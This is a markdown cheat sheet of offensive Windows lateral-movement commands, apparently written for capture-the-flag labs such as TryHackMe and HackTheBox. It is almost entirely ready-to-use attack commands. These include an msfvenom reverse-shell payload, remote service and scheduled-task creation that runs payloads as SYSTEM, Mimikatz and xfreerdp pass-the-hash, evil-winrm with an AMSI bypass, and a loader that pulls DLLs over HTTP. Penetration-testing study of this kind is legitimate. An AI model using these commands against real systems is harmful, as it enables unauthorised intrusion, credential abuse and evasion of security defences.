# Connection

## Remote administration

### Scheduler

Note that executables created by msfvenom to be used by a service have to be created with type exe-service instead of exe to prevent the shell from dying after the task is completed.

```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ip> LPORT=<port> -o <filename>.exe
```

With sc.exe

```
sc.exe \\<host> create THMservice binPath="<cmd>" start= auto
sc.exe \\<host> start THMservice
```

With schtasks

```
schtasks /s <host> /RU "SYSTEM" /create /tn "<task name>" /tr "<cmd or payload>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s <host> /run /TN "<task name>" 
```

### RunAs

Run with stored credentials

```
cmdkey /list                                      //get a list of credentials, runas will use the ones in memory
runas /savecred /user:<domain>\<user> "\\<ip>\<path>"      //connect to share
runas /savecred /user:<domain>\<user> "cmd.exe /k <cmd>"   //run command as user
```

Run by specifying username and password

```
runas /env /noprofile /user:<domain>/<user> <password> "cmd.exe /k <cmd>"
runas /netonly /user:<domain>\<user> "cmd.exe /k <cmd>"
```

Run as another user on the same machine

```
runas /user:<user> "cmd.exe /k <cmd>"
```

### WMI

Execute code

```
wmic.exe /user:<user> /password:<pass> /node:<host> process call create "cmd.exe /c <cmd>" 
```

Run local msi installer

```
wmic.exe /user:<user> /password:<pass> /node:<host>  product call install PackageLocation="<path to msi>"
```

### RDP

Mimikatz

```
privilege::debug
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash> /run:"mstsc.exe /restrictedadmin"
```

Xfreerdp

```
xfreerdp +clipboard /dynamic-resolution /cert-ignore /u:<user> /pth:<ntlm hash> /v:<host>
```

## Powershell remoting

### Manage sessions

Enable remoting (Administrative privileges required)

```
Enable-PSRemoting
```

connect to machine

```
Enter-PSSession -ComputerName <fqdn>
```

Store session data and connect

```
$<varname>= New-PSSession -ComputerName <fqdn>
Enter-PSSession -Sessions <varname>
```

### Code execution

Invoke-Command

```
//disable limit on laguage, enable scriptlets
Invoke-Command -ComputerName <fqdn> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}

Invoke-Command -ComputerName <fqdn> -ScriptBlock {<code>} 
Invoke-Command -ComputerName <fqdn> -FilePath <path>    //script from file
```

#### Code execution with valid credentials

Load credentials

```
$session = New-PSSession -ComputerName <fqdn>
$secPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\<username>', $secPassword)
```

Execute command

```
Invoke-Command -ComputerName <fqdn> -Credential $cred -ScriptBlock {<commands>}
```

Run a PowerShell script remotely

```
Invoke-Command -Credential $cred -ComputerName <fqdn> -FilePath <path to ps1 file> -Session $session
```

## Powershell + WMI module

### Connect to WMI

Store credentials

```
$username = '<user>';
$password = '<pass>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Start session. WMI supports two protocols: DCOM (port 135 and 49152-65535) or Wsman (ports 5985 and 5986)

```
$Opt = New-CimSessionOption -Protocol <DCOM|Wsman>
$Session = New-Cimsession -ComputerName <host> -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Execute command

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = "<cmd>"
}
```

### Create service

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "<name>";
DisplayName = "<name>";
PathName = "<payload>";
ServiceType = [byte]::Parse("16");
StartMode = "Manual"
}
```

Retrieve and start the service

```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '<name>'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

### Create scheduled task

```
$Command = "<executable i.e. cmd, powershell...>"
$Args = "<args>"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<name>"
Start-ScheduledTask -CimSession $Session -TaskName "<name>"
```

### Install MSI package

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<path to msi>"; Options = ""; AllUsers = $false}
```

## Evil-WinRM

Ps1 files must be stored in path specified by -s option. To execute a script simply type its name in the console.

```
evil-winrm -i <ip> -u Administrator -p <password>
evil-winrm -i <ip> -u Administrator -H <hash>
```

### In-memory execution + AMSI Bypass

Find pre-compiled binaries for in-memory execution here: [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

```
menu
Bypass-4MSI
Invoke-Binary <path to local compiled file>
```

### Dll loader

```
Dll-loader -http -path http://<path to .dll>
Dll-loader -smb -path \\<share>\\<file>.dll
Dll-loader -local -path C:\<path to dll>
```
